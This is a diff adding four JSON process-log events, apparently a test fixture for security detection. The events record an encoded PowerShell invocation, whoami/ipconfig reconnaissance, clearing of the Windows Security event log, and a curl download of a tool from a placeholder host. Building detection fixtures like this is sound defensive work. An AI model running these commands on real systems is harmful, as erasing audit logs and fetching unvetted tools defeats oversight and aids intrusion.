@@ -1,0 +1,4 @@
+{"@timestamp":"2026-07-31T22:00:00Z","process":{"name":"powershell.exe","command_line":"powershell.exe -enc SQBFAFgA"},"user":{"name":"analyst"}}
+{"@timestamp":"2026-07-31T22:01:00Z","process":{"name":"cmd.exe","command_line":"cmd.exe /c whoami && ipconfig /all"}}
+{"@timestamp":"2026-07-31T22:02:00Z","process":{"name":"wevtutil.exe","command_line":"wevtutil cl Security"}}
+{"@timestamp":"2026-07-31T22:03:00Z","process":{"name":"curl","command_line":"curl https://example.test/tool -o /tmp/tool"}}
